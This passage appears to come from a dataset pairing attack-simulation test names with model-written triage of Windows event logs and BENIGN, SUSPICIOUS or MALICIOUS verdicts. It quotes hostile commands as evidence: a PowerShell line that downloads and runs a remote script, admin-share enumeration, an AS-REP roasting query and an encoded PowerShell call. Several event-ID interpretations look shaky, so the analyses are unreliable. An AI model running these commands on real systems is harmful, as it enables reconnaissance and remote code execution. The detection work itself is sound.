- Review user activity associated with the `admin_test` account to ascertain if these commands and operations were intentional and authorized.
- Check for any alerts or patterns indicating potential reconnaissance or more broadly correlated anomalies that might not be apparent within this log set.
- Analyze any missing logs such as PowerShell, which might provide additional insights into scripts that could have been executed.

This measured approach ensures awareness of the risk without prematurely attributing malice where there might be legitimate explanations."
System Time with Windows time Command,"### Analysis of Windows Event Logs

#### Security Logs Analysis:
1. **EventID 4616**: These events indicate a system time change initiated by the process `svchost.exe`. Time changes are often legitimate, but frequent and unscheduled time changes could obscure logs and help cover tracks for malicious activities.
2. **EventID 4672**: A user with the name `admin_test` received special privileges. The privileges include `SeDebugPrivilege`, which can be used to access sensitive information or inject malicious code into system processes. The use of such privileges by an admin account needs further investigation.
3. **EventID 4624**: A successful logon event by the user `admin_test` using NTLM authentication from a remote IP address (`fe80::e3b5:5371:12a8:9c77`). Logon type 3 indicates a network logon, which is typical for remote access. However, paired with the elevated privileges from EventID 4672, this could suggest exploitation of credentials for unauthorized access.

#### Sysmon Logs Analysis:
1. **Process Creation (EventID 1)**: Usage of `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe` by the `admin_test` account is observed. These tools could be benign, but they are often used in reconnaissance activities.
2. **Cmd.exe Process**: Command line `cmd.exe /c time` executed, potentially linked with the time changes noted in EventID 4616, which should be considered suspicious.
3. **Edge Update Processes**: Multiple entries related to `MicrosoftEdgeUpdate.exe` and its components updating the browser seem legitimate, but excessive or off-scheduled activity might indicate potential malicious software masquerading as a legitimate application update.

#### System Logs Analysis:
1. **Kernel-Time Events**: Time changes by `svchost.exe` correlate with Security Log EventID 4616 changes. These frequent and close-timed changes to system time suggest the possibility of log tampering.

#### Conclusions:
The logs display activities that could align with both benign system operations and early signs of potentially malicious actors abusing legitimate processes and privileges to mask activities or gather information on the system environment. 

- The use of elevated privileges by `admin_test`, along with remote access, raises concerns about the potential misuse of administrative credentials.
- Execution of reconnaissance commands (`whoami`, `hostname`, `wevtutil`) and manipulation of system time align with common techniques used in advancing an attack within a network.

### Resolution: SUSPICIOUS

Given these findings, it is crucial to initiate deeper investigation steps:
- Conduct a thorough review of network access and unusual remote logins.
- Verify the legitimacy of elevated privileges grant and any possible misuse.
- Consider isolating the affected system for a more profound forensic analysis.
- Check for the latest backups and evaluate the need for a rollback if malicious activities are confirmed.

These actions will help discern whether a compromise has occurred and guide toward necessary remediation steps."
Network Share Discovery via dir command,"Based on the provided logs, here's a detailed analysis of potential suspicious or malicious behavior observed:

### Sysmon Log Analysis

1. **Process Execution**:
   - Multiple executions of `MicrosoftEdgeUpdate.exe` are observed throughout the logs. This could be legitimate system behavior, as Edge periodically checks for updates. 
   - Frequent usage of `wevtutil.exe`, which is a legitimate utility for managing Windows Event Logs, might be suspicious if not expected, as it can be used to clear event logs by malicious actors.
   - The `whoami.exe` and `cmd.exe` processes are run multiple times. While `whoami.exe` is generally harmless, `cmd.exe` usage with command-line arguments suggesting network or administrative share enumeration (`dir \\\\127.0.0.1\\c$`, etc.) is a common reconnaissance technique.

2. **Privilege and Integrity Levels**:
   - A significant number of processes, such as `cmd.exe` and `MicrosoftEdgeUpdate.exe`, are executed with high or system-level integrity, implying they were run with elevated privileges.
   - The activity by `SERVER002\\admin_test`, which is executed at a high integrity level, involves network enumeration. This could be indicative of privilege misuse if not expected in the environment.

3. **Command Line Activity**:
   - The `cmd.exe` usage to enumerate network administrative shares suggests possible lateral movement or reconnaissance activity. This might indicate an unauthorized user trying to gain more information about the network.

4. **Microsoft Edge Update Activity**:
   - The logs show multiple instances of `MicrosoftEdgeUpdate.exe` executing with different command-line arguments related to updates and registration, which is consistent with legitimate update processes. However, the sheer volume and frequency in a short period may warrant a deeper investigation to confirm legitimacy.

5. **Process Creation and Parent Processes**:
   - Processes like `MicrosoftEdgeUpdateComRegisterShell64.exe` appear to be legitimately spawned by `MicrosoftEdgeUpdate.exe` indicating a regular update process. 

6. **Potentially Malicious Command Sequence**:
   - A specific entry to note is the command run from `cmd.exe` with network share access patterns. As this could potentially be a foothold for lateral movement or data exfiltration, it deserves further verification by checking if the pattern of access matches defined administrative tasks or a potential breach.

### Overall Assessment

- **BENIGN**: The frequent execution of `MicrosoftEdgeUpdate.exe` can generally be expected as part of Microsoft's update mechanisms. However, due diligence should ensure these actions align with known update cycles and versions.
- **SUSPICIOUS**: The command-line involvement by `cmd.exe` particularly concerning network drive access patterns warrants further investigation to ensure these are legitimate actions taken by an authorized user or process.
- **MALICIOUS**: The usage of legitimate utilities like `wevtutil.exe` for potentially unexpected purposes such as unauthorized log access or deletion can sometimes indicate malicious intent. It's not conclusively malicious without further context.

### Recommendation

Finalize this investigation as **SUSPICIOUS** due to certain network enumeration activities. 

**Guidance on How to Proceed**:
1. **Verify Legitimacy**: Check with IT departments or system administrators to determine if this command-line activity was expected.
2. **Log Analysis**: Investigate further logs for any sign of unauthorized access corresponding with these events. This can include reviewing related Security logs or PowerShell logs (which might be missing here).
3. **User Verification**: Validate the activities and privileges of the `admin_test` account to ensure it matches expected behavior.
4. **System Audit**: Conduct a thorough audit of process execution trends to ensure no unusual patterns or anomalies exist.
5. **Update Assurance**: Ensure Microsoft Edge updates align with the installed version and update schedule to eliminate the possibility of masquerading applications.

Reassess the logs with additional context to finalize if any malicious activity needs addressing or if activities stand corrected as benign system behaviors."
WinPwn - shareenumeration,"### Detailed Analysis of the Logs:

#### Suspicious/Anomalous Behaviors:
1. **PowerShell Activity**: 
   - There are several PowerShell activities logged with the command line invoking a script from an external source (`https://raw.githubusercontent.com/script`). The command `iex(new-object net.webclient).downloadstring(...)` is a red flag as it is commonly used in ""Living off the Land"" techniques to execute scripts from external sources.
   
2. **High-Integrity Processes**:
   - Processes `whoami.exe` and `HOSTNAME.EXE` are executed at a high integrity level. While `whoami.exe` is a legitimate tool, its execution by the `SERVER002\admin_test` user multiple times within a short period can signal enumeration attempts, typical in reconnaissance phases of an attack.

3. **Edge Update Execution from Temp**:
   - The logs show multiple executions of Microsoft Edge Update-related files from temporary directories (e.g., `EUFB2F.tmp`). While updating processes are normal, they typically don’t execute from temporary directories unless manually initiated or manipulated.

4. **Frequent `wevtutil.exe`**:
   - Several instances of `wevtutil.exe` were executed by `SERVER002\admin_test`. `wevtutil.exe` is a legitimate tool used for managing event logs but could be used by attackers to clean logs or perform malicious activities without detection.

#### Indications of Malicious Activity:
- The presence of external script execution via PowerShell is highly indicative of malicious behavior, especially given the `iex` usage.
- Execution of legitimate system tools (`whoami.exe`, `wevtutil.exe`) in patterns aligned with reconnaissance or persistence, especially under the same user, suggests suspicious activity.

### Assessment and Threats Identified:
- **Assessment**: The logs contain indicators of potential compromise, specifically around the unusual PowerShell activities and access to external scripts, which stand out as malicious.
- **Threats**: Risk of system compromise through the execution of external scripts, potential data exfiltration, or further system exploitation.

### Conclusion and Guidance on How to Proceed:
**Resolution: MALICIOUS**

Given the evidence of potential script-based exploitation and behavior consistent with malicious reconnaissance activities, the actions described in the logs are likely malicious.

### Recommended Actions:
1. **Immediate Containment**: Disconnect the host from the network to prevent further execution or command and control communication.
2. **Thorough Investigation**: Review any related systems or network logs for other anomalous activities.
3. **Forensic Analysis**: Conduct a full forensic analysis of the system, especially focusing on the PowerShell scripts executed.
4. **Security Patches and Updates**: Ensure all security patches are up to date, especially for browsers and their update mechanisms.
5. **User Education and Post-Incident Review**: Educate users on spotting phishing or malicious command lines to prevent future incidents. Conduct a post-incident review to improve security postures, such as implementing stricter PowerShell execution policies."
Enumerate Users Not Requiring Pre Auth (ASRepRoast),"Upon examining the provided Sysmon and Windows PowerShell logs from the Server002 host, several points of interest stand out which may indicate suspicious or potentially malicious activity. Here is a detailed analysis of the findings:

1. **PowerShell Execution**:
   - The Sysmon logs show `powershell.exe` executions initiated by the user `SERVER002\admin_test`.
   - The specific PowerShell command observed is: `get-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq $TRUE}`. 
   - This command is used to query Active Directory (AD) user accounts that do not require pre-authentication, which is a common tactic used in reconnaissance by attackers to identify accounts potentially vulnerable to offline password cracking attacks or related to specific attack vectors like Kerberoasting.

2. **Frequent `wevtutil.exe` Usage**:
   - Multiple instances of `wevtutil.exe` are seen running almost concurrently:
     - `wevtutil.exe` is typically used to manage event logs, but its frequent invocation in such a short period can suggest attempts to clear logs, hide activities, or export logs for external analysis. The use of command line:
       ```
       ""C:\\Windows\\system32\\wevtutil.exe"" epl Microsoft-Windows-Sysmon/Operational C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\TempLog.evtx
       ```
     - This particular command is exporting Sysmon logs, which raises the suspicion that there might be an attempt to review or analyze the logs generated by Sysmon, possibly for stealth purposes.

3. **Host and Authentication Queries**:
   - Occurrences of `HOSTNAME.EXE` and `whoami.exe` are benign and generally used for obtaining basic system and user information. However, frequent querying of environment details along with other suspicious commands could support an attacker's situational awareness of the compromised environment.

4. **Process Monitor Pattern**:
   - It's noted that several system utilities (`conhost.exe`, `wermgr.exe`, etc.) are executed by `SERVER002\admin_test`. While these are standard Windows processes, the sequence and rapid execution might suggest process spawning to execute malicious commands or masks illicit activities under legitimate process names.

5. **Microsoft Edge Updates**:
   - The logs include instances of the `MicrosoftEdgeUpdate.exe` process with update-related activities. While this could be legitimate patching, the inclusion in the analysis timeline necessitates verification that updates were indeed legitimate and scheduled.

### Assessment:

Considering the PowerShell AD lookup without pre-authentication requirements, abnormal wevtutil usage, and the general pattern of process execution under a tested user account, the activity here can be deemed as **SUSPICIOUS**. Investigating why these utilities were used and evaluating whether the commands align with expected administrative tasks is necessary.

### Guidance:

1. **Immediate Actions**:
   - Verify the necessity and legitimacy of the PowerShell command executed by `SERVER002\admin_test`.
   - Assess the security practices for Active Directory regarding accounts that do not require pre-authentication.
   - Monitor further usage of PowerShell commands and `wevtutil.exe` executions on this host.

2. **Further Investigation**:
   - Cross-reference the actions with any other internal security events or alerts.
   - Conduct user access reviews to ensure `admin_test` and similar accounts haven't been compromised.
   - Evaluate access permissions and recent account changes in Active Directory associated with `admin_test` and similar profiles.

3. **Mitigation**:
   - Strengthen account authentication policies, especially around accounts identified as having the ""Does Not Require Pre-Auth"" flag.
   - Consider deploying more rigorous monitoring for critical accounts and environments.

Given these elements, more examination into the timeline of events and activities by involved processes is advised. The events as logged could be at risk of escalation without further scrutiny."
List Internet Explorer Bookmarks using the command prompt,"Based on the analysis of the provided Windows event logs, here's the detailed assessment:

### Key Observations:

1. **Time Change Events:**
   - Multiple time adjustment logs (EventID 1 and 24 from Microsoft-Windows-Kernel-General) suggest legitimate system time synchronization operations. The synchronization with an NTP server (`time.windows.com`) and the use of svchost.exe for this task indicates normal Windows behavior.

2. **Service Events:**
   - The `edgeupdate` service logs indicate the starting and stopping of Microsoft Edge Update services. This activity is consistent with regular update processes for maintaining Microsoft Edge and does not show any anomalous behavior.

3. **Use of Windows Utilities:**
   - Sysmon logs show the execution of various utilities like `cmd.exe`, `whoami.exe`, `hostname.exe`, `conhost.exe`, and `wevtutil.exe`.
   - These utilities were executed by `SERVER002\admin_test` with high integrity. The command run by `cmd.exe` involves directory listing of user profile favorites, which could potentially be used for reconnaissance. However, this is not inherently malicious unless correlated with other atypical activities.

4. **Microsoft Edge Update Executions:**
   - There are numerous Sysmon logs for Microsoft Edge Update processes. The processes are executed by `NT AUTHORITY\SYSTEM` with the integrity level set to System, which indicates legitimate update operations.
   - The update processes are occurring in directories related to Microsoft Edge (`C:\Program Files (x86)\Microsoft\EdgeUpdate\`), and the command line parameters used are typical for update routines.

5. **Command Line Arguments:**
   - The command line entries for processes like `MicrosoftEdgeUpdate.exe` and `MicrosoftEdgeUpdateComRegisterShell64.exe` involve routine update and registration operations. No signs of malicious use of these arguments were detected.

### Assessment:

- The logs show routine updates and typical usage of system utilities. The `cmd.exe` operation for listing user profile favorites could be a concern if not expected in a specific use context, but by itself does not indicate a compromise.
- There is no evidence of privilege escalation attempts or unauthorized access within these logs. Activities related to time synchronization, updates, and use of Windows utilities align with normal operations for maintenance and system management.

### Final Resolution: **BENIGN**

The log entries provided appear to reflect routine operations and system maintenance activities. There is no conclusive evidence of any malicious activity. The event logs indicate typical behavior for a Windows system responsible for maintaining time synchronization and performing software updates.

### Guidance:

- Ensure logging and continuous monitoring are in place to detect any future anomalies.
- Conduct regular audits and reviews of command-line activities, especially for administrator accounts, to mitigate any potential misuse.
- Maintain an understanding of expected system behaviors to quickly identify deviations that need further investigation."
TruffleSnout - Listing AD Infrastructure,"**Detailed Analysis**

Upon reviewing the provided event logs from the `Application` and `Microsoft-Windows-Sysmon/Operational` channels, several points of interest are identified:

1. **Application Log:**
   - Windows Defender is shown as active with state `SECURITY_PRODUCT_STATE_ON`. No indication of any alerts or issues from Windows Defender within these logs.
   - The `Microsoft-Windows-Security-SPP` entry indicates the regular functioning of the Software Protection Platform with no anomalies.

2. **Sysmon Logs:**
   - **Powershell Execution:** Powershell is executed by the user `admin_test` from an administrative context. While powershell usage is common for legitimate administration, it's also frequently used by attackers. Without specific command-line arguments, the intent is unclear, but remains a red flag in this context.
   - **Conhost Executions:** Multiple instances of `conhost.exe` are seen being spawned. These are associated with typical command-line or script executions, but do not immediately indicate malicious activity by themselves.
   - **Wevtutil Executions:** The use of `wevtutil.exe` is notable. This utility is typically used for exporting, archiving, and clearing event logs. Its frequent invocation might suggest an attempt to hide or alter log data.
   - **`TruffleSnout.exe` Command Execution from CMD:** Notably, there is a script execution `/c` using `cmd.exe` from `ADMIN_~1` temporary directory involving `TruffleSnout.exe`. This is highly suspicious. `TruffleSnout.exe` does not correspond with known legitimate applications and ""snout"" could imply data sniffing or extraction.
   - **Whoami and HOSTNAME Executions:** These executions by `whoami.exe` and `hostname.exe` are typical for querying system information and are not inherently malicious. However, they appear in sequence with the suspicious executions.
   - **Integrity Level and Context:** The integrity level for most of the processes is `High`, which implies they're run with elevated privileges. This is normal if initiated legitimately by an administrator, but concerning if the admin user account is compromised.

**Threat Assessment**

- **Suspicious Activity:** The continuous spawning of utilities like `conhost.exe` with such high frequency, specifically paired with `cmd.exe` involving an unknown `TruffleSnout.exe`, suggests a coordinated action that might be suspicious. The use of `wevtutil` could indicate log manipulation. Although individually these actions may coincide with regular administration, in aggregate, they suggest further inspection is necessary.

- **Potential Risk:** 
  - The execution of unknown applications, especially from temporary directories, can pose a risk of data exfiltration or further system compromise.
  - The presence of PowerShell executions and attempted (or successful) manipulation of event logs are tactics often used in malicious operations to both exploit and obscure evidence of compromise.

**Recommendation**

Given the combination of unusual application execution and potential log manipulation, this activity warrants further investigation:

1. **Immediate Actions:**
   - Restrict the network access of the affected host `Server002`.
   - Conduct a thorough review of user activity for `admin_test` around the time of the logs.
   - Analyze the file `TruffleSnout.exe` for potentially harmful characteristics or payloads.
   - Examine file system changes and data access patterns during the timeframe specified.

2. **Long-term Actions:**
   - Increase monitoring on all privilege escalation events and script execution logs for heightened alerting.
   - Implement stricter policies for administrative access and execution of scripts directly from temporary directories.

**Final Resolution:** **SUSPICIOUS**

The detected activity is not conclusively malicious but highly unusual and indicative of behaviors associated with compromise techniques. Further investigation is recommended to rule out or confirm any malicious intent."
Query Registry with Powershell cmdlets,"**Analysis Summary:**

After analyzing the provided Windows event logs, several patterns and activities have been noted. Below is a breakdown of key observations from each log type:

1. **Application Log:**
   - The only entry indicates that Windows Defender is running and active, suggesting that antivirus protection is enabled on the system. This is generally a positive indicator for system security.

2. **PowerShell Log:**
   - Multiple PowerShell activities are logged, specifically accessing and querying various registry paths. The PowerShell script appears focused on areas of the registry that are commonly used for persistence mechanisms and running services.
   - Although accessing these registry paths via PowerShell can be legitimate for system management tasks, it could also indicate reconnaissance or preparation for persistence by an attacker, if unexpected. This access to sensitive registry areas warrants further investigation.

3. **Sysmon Log:**
   - The logs include the execution of utilities like `whoami.exe`, `findstr.exe`, `hostname.exe`, and several others. The use of `whoami.exe` and `hostname.exe` is typical to understand the user context and system identity; however, their frequent use may be highlighted in an investigation context, especially when running under an elevated integrity level.
   - The execution of `Microsoft Edge` installation and updates seems legitimate as part of software maintenance routine.
   - There are several `wevtutil.exe` instances logged, which is often used to manage the Windows Event Log. Without explicit command lines or configurations, they are suspicious if not expected system behavior.
   - `Microsoft Malware Protection` activities (e.g., `AM_Delta.exe` and `MpSigStub.exe`) suggest the presence of legitimate update and malware protection processes.

4. **System Log:**
   - Includes entries related to Microsoft Defender Antivirus updates. Regular updates are typically benign, indicating active software maintenance and defense capabilities.

5. **Security Log:**
   - The `5379` event IDs indicate failed retrieval of credentials, which may signal probing for credential information or a system attempting authentication or service access. The repetition of such events merits investigation to confirm if they're routine system errors or indicate a security concern.

**Assessment:**

Based on the above analysis:

- Most activities observed could be legitimate administration or update tasks. However, the comprehensive use of PowerShell with access to registry keys, combined with Sysmon indicating repeated `wevtutil.exe` executions, present a **SUSPICIOUS** pattern.
- The suspicious behavior could signal unauthorized reconnaissance or system modification, emphasizing the need for verification against expected system and user activities.

**Resolution:**
- **SUSPICIOUS**

**Guidance on How to Proceed:**

1. **Contextual Verification:**
   - Confirm if the PowerShell scripts and `wevtutil.exe` executions align with any known administration scripts or tasks scheduled by IT. If not, further investigate their source and purpose.

2. **User Verification:**
   - Check the legitimacy and activity history of the `SERVER002\admin_test` user, considering if actions taken align with known responsibilities.

3. **Alert Investigation:**
   - Investigate the Security logs for unauthorized access attempts or repeated failed credentials attempts. Ensure credential protection and determine if any unauthorized actors have attempted access.

4. **Enhanced Monitoring:**
   - Set up alerts or enhanced logging on PowerShell and `wevtutil.exe` access until the activities are fully understood or remediated.

5. **Review System Integrity:**
   - Ensure no unauthorized changes have been made to the operating system or installed applications.

By following these steps, further clarity can be obtained on whether the suspicious actions are malicious or benign in intent."
System Information Discovery,"### Detailed Analysis:

1. **Consistent Use of Administrative Account:**
   - Throughout the logs, the `admin_test` user is continuously being utilized. This account appears to be a system administrator on the machine `Server002`. The repeated and consistent use of this account suggests routine administrative activities, not unusual for a server environment.

2. **Frequent Use of Sysinternals and System Utilities:**
   - Logs indicate multiple executions of system-related executables such as `wevtutil.exe`, `whoami.exe`, `cmd.exe`, `systeminfo.exe`, and `reg.exe`. This reflects typical administrative tasks:
     - **`wevtutil.exe`** is a command-line tool for managing event logs.
     - **`whoami.exe`** and **`hostname.exe`** are used for gathering system information.
     - **`cmd.exe`** has a command line indicating system information requests and registry queries.
     - **`reg.exe`** for querying registry information.
   - These would be benign if verifying system status or troubleshooting issues.

3. **Odd Observation in Process Execution:**
   - A single instance where a `<unknown process>` is listed in event records. This generally could indicate a potential anomaly, such as an interrupted or improperly terminated process, but in the absence of correlating suspicious activity, it is not enough by itself to be considered malicious.

4. **Microsoft Edge Update Activity:**
   - Numerous entries related to Microsoft Edge Update processes are recorded. This involves typical update operations like `update`, `regsvc`, and `regserver`. These actions align with the auto-update features of Microsoft Edge, which would be expected behavior on a system connected to the internet, receiving updates.

5. **System Time Adjustment:**
   - There are kernel events indicating a backward time adjustment. Time synchronization with an NTP server (time.windows.com) is common, but the security log entry (Event ID 4616) shows adjustment, possibly indicating a time correction.
   - This could be indicative of an attempt to obscure activity timestamps or it could just be a benign time sync.
   
6. **Privileged Logons:**
   - Multiple logon sessions detected, such as those indicated by Event ID 4624 and special privileges granted (Event ID 4672) to `admin_test`. Privileges like `SeDebugPrivilege` and `SeTakeOwnershipPrivilege` are often associated with legitimate administrative operations, but can also be exploited for malicious purposes if not monitored.

### Assessment and Resolution:

Based on the provided logs:
- The activities described primarily point towards legitimate administrative tasks associated with system maintenance and updates.
- The presence of privilege escalation (through Event ID 4672) and time adjustments (Event ID 4616) can be warranted in routine admin operations.

However, the operation of the `<unknown process>` and time adjustment warrant a cautious approach as they could be early indicators of malicious activity or entirely benign based on further context.

### Resolution:
- **SUSPICIOUS**: Further investigation is recommended, especially to corroborate the reason behind the `<unknown process>` and why the time was adjusted. If no additional threatening activity is found, it can then be categorized as benign administrative operations. However, increased scrutiny and possibly some restriction on `admin_test` privileges would mitigate risk.
"
Simulating MAZE Directory Enumeration,"Upon reviewing the logs provided, I have identified the following points of interest that suggest suspicious activity, indicating potential malicious behavior:

### Analysis of Logs:

1. **Windows PowerShell Log**
   - **Command Execution**: The PowerShell command executed is harvesting directory listings from user profile directories, program files, and app data locations, and writing these to a temporary file (`$env:temp\dataTest5.txt`). Collecting such information without explicit administrator consent or a legitimate reason could be indicative of reconnaissance activities typical in early stages of compromise.
   - **Stealth**: The use of `-ErrorAction SilentlyContinue` indicates an attempt to suppress error messages which may suggest the intention to avoid detection.

2. **Security Log**
   - **Time Manipulation**: There are `EventID 4616` entries for system time changes, often associated with attempts to alter logs or circumvent time-based security measures. Logs show sequences where time manipulation took place with minimal time differences but are noted for auditable interest.

3. **Sysmon Log**:
   - **Abnormal Process Activity**: Several processes such as `wevtutil.exe`, `conhost.exe`, and `hostname.exe` were executed by the user `SERVER002\admin_test`. The frequent launching of `wevtutil.exe` suggests possible log manipulation attempts.
   - **Elevation Attempts**: The operations' high integrity levels indicate potential privilege escalation.

### Assessment:

- **Suspicious Behavior**: The combination of directory enumeration using PowerShell, attempts to change system time, and potential log modification attempts using `wevtutil.exe` all hint at malicious activity, indicative of a potential intrusion or preparatory steps for further compromise.

### Resolution: SUSPICIOUS

Given the collective suspicious activities, more thorough investigation is required to determine the full scope of activities and whether they have resulted in a security incident. It's vital to perform the following actions:

1. **Immediate Action**: 
   - Isolate the host (Server002) until the situation is clarified to prevent any potential spread.
   
2. **Further Investigation**:
   - Review network and file access logs to determine if data exfiltration occurred.
   - Examine recent system changes or configurations and verify accounts for unauthorized modifications.
   - Conduct a security assessment of deployed applications for vulnerabilities.

3. **Long-term Action**:
   - Implement stricter PowerShell execution controls using Group Policy settings.
   - Enable detailed logging and monitoring on critical system processes for earlier threat detection.
   - Educate and train staff to recognize signs of potential phishing attacks or suspicious system behaviors to prevent similar occurrences.

While this activity appears indicative of potential malicious intent, confirmation requires deeper forensic analysis considering the gathered context and findings."
System Service Discovery,"Upon analyzing the given event logs from the Windows machine, several points of interest were noted:

### System Logs
- **Event ID 44 and 43**: Records related to the Windows Update client for Microsoft Defender Antivirus updates appear normal and periodic. The events do not suggest any anomalous behavior.

### Security Logs
- **Event ID 5379**: These logs represent Credential Manager events for attempts to retrieve stored credentials. The consistent `ReturnCode` of `3221226021` suggests a failed operation or inability to retrieve credentials during these recurring events. This might indicate benign behavior related to system activity or a misconfiguration, but might also warrant further examination if correlated with anomalous user behavior at the same times.

### Sysmon Logs
- **Event IDs 1 and 5**: There are numerous process creation and termination logs involving a user `SERVER002\\admin_test` executing commands like `wevtutil.exe` and `cmd.exe` with operations related to tasks and querying services:
  - The use of `tasklist.exe` and `sc query` can be typical for diagnosing system services and states.
  - The sequence using `cmd.exe` to execute multiple queries is somewhat unusual in normal user activity, especially if repetitive or if `admin_test` is not a recognized high-privileged user.
  
- **WMI Activity**: The presence of `wmiprvse.exe` could indicate monitoring or configuration activity, which can be legitimate unless unusual timings, parameters, or user contexts are identified.

- **Process Execution under NT AUTHORITY\SYSTEM**: Several processes run under this high-level authority, which is commonplace for services but should be considered in tandem with process behaviors to rule out privilege escalation attempts.

### Assessment
- Based on the logs, `admin_test` executing system-level queries using `sc query` and task listing commands alongside log manipulation utilities (`wevtutil.exe`) looks slightly out of the ordinary if the user doesn't routinely administer systems.
- The recurrence of credential retrieval errors involving `SERVER002$` and an account identifier in the Security logs could point to synchronization/configuration issues but lacks definitive malicious intent evidence.

**Resolution**: **SUSPICIOUS**

### Guidance
- **Immediate Steps**: Verify the identity of `admin_test` and authorize use of the system tools. Check if these actions align with regular administrative workflows or incident responses.
- **Review Configuration**: Investigate the root of the credential manager errors; ensure these are not symptomatic of a larger misconfiguration or access control issue.
- **Monitor and Isolate**: If user `admin_test` activities are unapproved, restrict account privileges and implement additional logging and monitoring to capture future command-line activity or remote logins.
- **Threat Hunting**: Consider a lightweight threat-hunting exercise focused on services executed by `SERVER002\\admin_test`, particularly focused on any unintended persistence mechanisms or unauthorized system alterations.

In summary, while the logs do not definitively indicate malicious activity, some actions and errors warrant further scrutiny to rule out compromise potential."
Get-EventLog To Enumerate Windows Security Log,"**Analysis of Windows Event Logs:**

1. **Security Log Analysis:**
   - **Event IDs 4624 and 4672:** These represent successful logon events, and a privilege assignment to the SYSTEM account, respectively. The SYSTEM account has been assigned a series of high-level privileges, which is typical for system processes but can also indicate malicious activity if not usual for the environment.
   - **Event ID 4798:** This event lists users who belong to a specific group. It is associated with the SYSTEM account, potentially collecting information.
   - **Event ID 5379:** These events relate to credential validation failures. The subject used was SERVER002$, indicating a machine account operation with repeated failure codes. This might be related to attempts to access or read system-stored credentials, but failures are observed.

2. **Sysmon Log Analysis:**
   - **Process Creation (Event ID 1):** Multiple processes initiated by the `admin_test` account include PowerShell scripts and command-line utilities like `whoami` and `wevtutil`. Notably, the command `""powershell.exe & {powershell -c {get-eventlog 'Security' | where {$_.Message -like '*SYSTEM*'} | export-csv $env:temp\\data_events.txt}}""` appears to be an attempt to fetch and potentially exfiltrate logs, which is suspicious.
   - **Network Connections and Pipe/Service Handle Requests (Event ID 5):** Several instances of typical system utilities such as `sc.exe`, `rundll32.exe`, and `CompatTelRunner.exe` are shown running by the SYSTEM user. These don't appear inherently malicious unless tied with unauthorized commandline usage or timing.

3. **Windows PowerShell Log Analysis:**
   - **Activity:** The presence of encoded command execution `powershell.exe -encodedCommand ZwBlAH...` raises concerns since encoded scripts are often used to obfuscate actions in PowerShell, noted for security evasion.

**Assessment:**

- **Suspicious Behavior:**
  - The excessive high-privilege account usage, especially SYSTEM-level privilege allocations (`4672`), suggests potential privilege escalation activities.
  - The PowerShell activity, specifically the one exporting security logs and the use of encoded commands, details a behavior pattern often used in reconnaissance or preparatory phases of an attack.
  - Continuous attempts to read credentials with failures (`5379`) raise alarms regarding potential credential harvesting attempts.

**Resolution: SUSPICIOUS**

- The variety of high-privilege process executions and the presence of encoded PowerShell commands without clear intent signifies activity that is not outrightly benign and warrants further investigation. Given the potential for privilege abuse leading to data collection or system compromise, these findings could be part of unauthorized reconnaissance or lateral movement attempts.

**Guidance on How to Proceed:**

1. **Immediate Actions:**
   - Verify if the activity was expected or sanctioned, perhaps part of administrative scripts or maintenance tasks.
   - Check for any recent changes in scripts or job schedules involving the `admin_test` user or SYSTEM privileges.
   - Review network connections during this timeframe for any unauthorized or unusual patterns.

2. **Further Investigation:**
   - Correlate these findings with other logging sources or alerts from intrusion detection systems (IDS) to ascertain if they tie in with known attack signatures.
   - Conduct a review of accounts with administrative privileges and their recent activity.

3. **Enhance Security Posture:**
   - Increase monitoring on high-privilege accounts and their network interactions.
   - Consider implementing stricter access controls, particularly around the use of administrative PowerShell commands."
Enumerate all accounts via PowerShell (Local),"### Analysis of the Logs

#### System Log Analysis
- **Time Synchronization Events**: Multiple Time Change events triggered by `svchost.exe` are noted. These events (Event ID 1) suggest updates to system time, typically related to synchronization with a time server. This activity is generally benign, and it's identified that `time.windows.com` was used for synchronization.
  
#### Security Log Analysis
- **Event 4799 (Member added to a local group)**: Multiple entries appear where the user `admin_test` manipulated user groups using PowerShell (`powershell.exe`). Although not malicious on its own, frequent `4799` events combined with PowerShell usage deserve attention as they could indicate privilege escalation activities.
- **Event 5379 (Credential Validation)**: There is a failed credential validation which returned ""3221225567"", a common error code for failures, potentially signaling unauthorized access attempts or system misconfigurations.
  
#### Sysmon Log Analysis
- **Process Execution**: Noteworthy is the execution of several command-line utilities such as `whoami.exe`, `wevtutil.exe`, and `net.exe` which interact with the Windows environment, potentially to gather information or manage users/groups. The execution of `powershell.exe` with command arguments such as `net user`, `get-localuser`, `get-localgroupmember`, and `cmdkey.exe /list` is notable.
- **PowerShell Activities**: The given PowerShell script reads users and group membership information and lists directory contents, which may align with reconnaissance activities in a compromise scenario.
- **Microsoft Edge Updates**: Various Edge update processes are detected across multiple entries. This may be normal background activity for keeping the browser updated.

#### Windows PowerShell Log Analysis
- **Command Execution**: Consistent with the Sysmon logs, `powershell.exe` initiates with detailed command-line execution, reinforcing typical reconnaissance behavior. The commands do not directly implicate maliciousness but can assist in further compromise if ill-intended.

#### Application Log Analysis
- **Edge Update Logs**: Edge update service entries indicate stop/start sequences which align with maintenance or routine updates.

### Assessment

- **Suspicious Activities**:
  - The use of PowerShell to manipulate user groups and reconnaissance-like commands executed by `admin_test` raises suspicion particularly in a compromised scenario. The combination of frequent group changes and exploration of users/groups via command-line interface aligns with credential or privilege escalation tactics seen in lateral movement phases of an attack.

Based on the analysis of the logs, the logs neither contain explicit evidence of compromise nor prove that the behavior is entirely benign. However, the usage patterns and tools executed align with known malicious use cases like privilege escalation and reconnaissance. Therefore, further investigation into the context behind these recent activities including reviewing additional logs, verifying user actions, and threat intelligence towards the user/admin actions, are warranted.

### Resolution
- **Resolution**: SUSPICIOUS

### Recommendations
- Conduct an audit on the `admin_test` account activities within the timeframe of these logs.
- Review any alerts corresponding to these activities in your security monitoring tools.
- Investigate the intention and necessity of the PowerShell scripts and executed commands, especially those enumerating user groups.
- Validate system integrity and consider enhanced monitoring for potential suspicious activities moving forward."
Azure - Dump Subscription Data with MicroBurst,"After a detailed analysis of the provided Windows event logs, I have identified several aspects that stand out and potential indicators of malicious activity:

1. **Unusual PowerShell Activity**: 
   - The logs show the execution of PowerShell commands, including scripts like ""Get-AzDomainInfo.ps1"", which is imported from a user’s temporary directory. This activity involves administrative-level tasks like connecting to Azure accounts, which could be concerning if not expected or authorized.
   - These PowerShell activities contain commands associated with automation or bulk data operations (e.g., credential management and domain information retrieval), which might be benign if part of an administrator's routine tasks but warrant further verification.

2. **CompatTelRunner.exe Usage**:
